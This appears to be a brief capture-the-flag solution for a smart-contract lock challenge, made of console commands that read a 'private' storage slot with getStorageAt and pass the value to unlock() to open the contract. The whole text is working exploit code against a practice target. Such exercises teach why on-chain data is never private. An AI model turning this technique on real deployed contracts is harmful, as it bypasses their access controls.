# Checking if contract locked
(await contract.locked())

# Get storage info from private information
web3.eth.getStorageAt(contract.address, 3, function(error, result){ alert(result); })

# Unlock account based on the information
contract.unlock("0xa8824b0f9046f4392f91ea75c04cda45e58feb3ce29b8f287f77062ba3a115f6")

# Check if contract locked
(await contract.locked())











  